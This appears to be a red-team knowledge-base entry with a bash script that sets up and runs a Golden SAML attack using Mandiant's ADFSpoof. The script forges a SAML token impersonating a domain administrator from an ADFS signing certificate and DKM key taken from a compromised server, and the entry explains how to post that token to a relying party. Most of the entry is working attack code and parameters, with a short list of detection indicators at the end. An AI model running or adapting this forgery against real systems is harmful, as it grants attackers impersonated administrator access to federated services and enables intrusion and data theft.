---
type: code
language: bash
verified: true
tags:
  - saml
  - adfs
  - automation
platforms:
  - Linux
  - macOS
validated: true
---

# bash-script-for-golden-saml-attack-setup-and-execution

## Code

```bash
mkdir ADFSpoofTools
cd $_
git clone https://github.com/dmb2168/cryptography.git
git clone https://github.com/mandiant/ADFSpoof.git 
virtualenv3 venvADFSSpoof
source venvADFSSpoof/bin/activate
pip install lxml
pip install signxml
pip uninstall -y cryptography
cd cryptography
pip install -e .
cd ../ADFSpoof
pip install -r requirements.txt
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'
```

## Description

This bash script automates the full setup and execution of a Golden SAML attack using ADFSpoof. It creates the project directory, clones repositories, sets up a virtual environment, installs dependencies (including a modified cryptography library), and runs the forging command with example parameters to generate a SAML token impersonating a domain administrator.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `adfs.pentest.lab` | ADFS server hostname | adfs.example.com |
| `https://www.contoso.com/adfs/ls/SamlResponseServlet` | ADFS SAML endpoint URL | https://adfs.example.com/adfs/ls/SamlResponseServlet |
| `PENTEST\\administrator` | Domain and username to impersonate | DOMAIN\\user |
| `Supervision` | Relying party identifier | urn:example:rp |
| `'<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'` | Custom SAML assertions XML | Custom attribute string |

## Usage

Save this as a .sh file, make executable (`chmod +x script.sh`), prepare EncryptedPfx.bin and DkmKey.bin beforehand, then run `./script.sh`. Customize parameters before execution. Use in red team engagements after obtaining the certificate and key from a compromised ADFS server. The output SAML token can be base64-encoded and posted to the relying party for authentication.

## Detection

- Monitor for git clones of ADFSpoof or cryptography forks in attacker-controlled environments.
- Python virtual environment creation and pip installs of lxml/signxml in unusual contexts.
- Network traffic to ADFS endpoints with malformed or unexpected SAML requests.
- ADFS logs showing tokens signed with valid but anomalous certificates.
- Process monitoring for python ADFSpoof.py executions.

## Related

- [[procedures/Golden-SAML-Attack-via-ADFS]]
